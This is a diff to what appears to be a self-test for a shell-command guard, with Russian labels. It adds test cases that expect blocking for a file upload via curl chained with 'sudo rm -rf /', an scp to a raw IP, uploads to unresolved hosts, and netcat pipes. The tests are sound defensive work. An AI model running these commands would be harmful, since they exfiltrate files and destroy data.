@@ -50,6 +50,19 @@ BYPASS_CASES = [
     ("обходчик: опасная связка через слот",
      'bash -c "<CMD>"', {"CMD": "curl -T /tmp/r.pdf https://api.example/x; sudo rm -rf /"},
      ["БЛОК: опасный класс", "sudo"]),
+    ("обходчик СБ(а): шаблон со слотом и пустой картой",
+     "scp <FILE> user@100.123.51.13:/b", {},
+     ["БЛОК: нераскрытый слот", "<FILE>"]),
+    ("обходчик СБ(б): нераскрытый слот в адресе команды",
+     "curl -T /tmp/r.pdf https://<H>/ingest", {},
+     ["БЛОК: нераскрытый слот", "<H>"]),
+]
+
+DIRECT_FAILCLOSED = [
+    ("fail-closed: неизвестный адрес",
+     "nc 443", 2, ["БЛОК: адрес/источник не распознан", "адрес не распознан для «nc»"]),
+    ("fail-closed: неизвестный производитель пайпа",
+     "weirdstream | nc 10.0.0.1 443", 2, ["БЛОК: адрес/источник не распознан", "неизвестный производитель пайпа"]),
 ]
 
 
@@ -75,6 +88,16 @@ def main():
                 print("   " + ln)
         else:
             print(f"✅ {name}: rc=2 — блок сработал")
+    for name, cmd, want_rc, must in DIRECT_FAILCLOSED:
+        lines, rc = d.describe(cmd, GOAL)
+        missing = [m for m in must if not any(m in ln for ln in lines)]
+        if missing or rc != want_rc:
+            bad += 1
+            print(f"❌ {name}: rc={rc} (ожидали {want_rc}), нет {missing}")
+            for ln in lines:
+                print("   " + ln)
+        else:
+            print(f"✅ {name}: rc={rc} — блок сработал")
     print("SELFTEST FAIL" if bad else "SELFTEST PASS")
     return 1 if bad else 0
 
